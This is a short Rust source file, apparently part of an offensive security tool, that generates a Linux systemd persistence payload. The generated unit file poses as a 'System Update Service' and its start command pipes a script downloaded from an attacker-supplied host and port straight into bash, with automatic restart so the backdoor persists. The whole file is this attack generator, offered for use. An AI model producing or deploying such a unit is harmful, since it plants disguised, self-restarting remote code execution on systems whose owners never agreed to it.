// Linux systemd persistence payload generator
use crate::cli::banner;

pub struct SystemdGenerator;

impl SystemdGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("SYSTEMD-PERSISTENCE", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'curl -s http://{}:{}/payload.sh | bash'
Restart=always

[Install]
WantedBy=multi-user.target"#,
            lhost, lport
        )
    }
}
